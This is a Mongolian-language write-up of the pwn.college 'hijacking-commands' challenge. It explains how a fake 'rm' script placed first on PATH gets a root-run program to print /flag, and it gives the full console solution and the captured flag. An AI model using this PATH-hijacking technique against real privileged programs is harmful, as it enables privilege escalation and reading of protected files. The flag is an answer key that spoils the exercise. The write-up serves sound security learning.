# Hijacking Commands

> Module: **Linux Luminarium / Pondering Path** · Challenge: `hijacking-commands`

Флагийг `cat` хийдэг хуурамч `rm` script бичиж, түүний директорийг `PATH` болгосноор `/challenge/run`-ийн `rm`-ийг өөрийнхөөрөө сольж флаг авна.

## Тайлбар

- Энэ challenge эхний level-тэй бараг адил — `/challenge/run` `/flag`-ийг `rm`-ээр устгана, гэхдээ энэ удаа юу ч хэвлэхгүй. Тиймээс `PATH=""` хийгээд `rm`-ийг олдохгүй болгох нь хангалтгүй.
- `rm`-ийг `PATH`-д жагсаасан директоруудаас хайдаг. Өмнөх level-д `win` үүсгэсэн шигээ `rm` нэртэй өөрийн script-ийг үүсгэвэл `/challenge/run` жинхэнэ `/bin/rm`-ийн оронд түүнийг ажиллуулна — **command hijacking**.
- Хуурамч `rm` нь `/bin/cat /flag` хийнэ. `PATH=/home/hacker/scripts` болгосон тул `cat`-ийг absolute path-аар дуудах шаардлагатай.
- `/challenge/run` root эрхээр ажилладаг тул бидний `rm` ч мөн root-оор ажиллаж `/flag`-ийг уншиж чадна.

## Solution

```console
hacker@path~hijacking-commands:~$ mkdir -p /home/hacker/scripts
printf '#!/bin/bash\n/bin/cat /flag\n' > /home/hacker/scripts/rm
chmod +x /home/hacker/scripts/rm
PATH=/home/hacker/scripts
/challenge/run
Trying to remove /flag...
pwn.college{c3LSOeRVX_9jRJDb_VM8BSMZYQn.QX3cjM1wyMwEzM2EzW}
hacker@path~hijacking-commands:~$
```

## Flag

```
pwn.college{c3LSOeRVX_9jRJDb_VM8BSMZYQn.QX3cjM1wyMwEzM2EzW}
```
